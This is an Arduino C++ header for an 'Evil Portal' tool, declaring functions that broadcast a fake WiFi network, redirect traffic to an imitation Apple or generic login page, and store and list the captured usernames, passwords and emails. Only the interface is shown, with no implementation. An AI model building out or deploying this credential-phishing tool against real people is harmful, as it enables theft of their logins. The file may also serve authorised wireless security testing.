#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <Arduino.h>

// Captured credential structure
struct CapturedCredential {
    String username;
    String password;
    String email;
    uint32_t timestamp;
};

// Function declarations for Evil Portal/Captive Portal attacks

/**
 * Initialize Evil Portal (Fake AP + Captive Portal)
 * Creates a fake WiFi network that redirects all traffic to a login page
 * 
 * @param ssid Network name to broadcast
 * @param portal_type 1=Apple WiFi Login, 2=Generic Login
 * @return true if portal started successfully
 */
bool initEvilPortal(const char* ssid, int portal_type);

/**
 * Main loop function - MUST be called in the main loop
 * Processes DNS requests and web server requests
 * 
 * Call this in your main loop:
 *   void loop() {
 *       evilPortal_loop();
 *       // other code
 *   }
 */
void evilPortal_loop();

/**
 * Stop the evil portal
 * Closes the fake AP and web server
 */
void stopEvilPortal();

/**
 * Get number of credentials captured
 * @return Number of credentials stored
 */
int evilPortal_getCredentialsCount();

/**
 * Get specific credential by index
 * @param index Credential index (0-based)
 * @return CapturedCredential structure
 */
CapturedCredential evilPortal_getCredential(int index);

/**
 * Get all credentials as formatted string
 * @return Formatted string with all captured credentials
 */
String evilPortal_getCredentialsString();

/**
 * Clear all captured credentials
 */
void evilPortal_clearCredentials();

/**
 * Get evil portal status
 * @return true if portal is active
 */
bool evilPortal_getStatus();

/**
 * Get number of clients connected to fake AP
 * @return Number of connected clients
 */
int evilPortal_getConnectedClients();

// Portal type constants
#define PORTAL_TYPE_APPLE    1
#define PORTAL_TYPE_GENERIC  2

#endif // EVIL_PORTAL_H
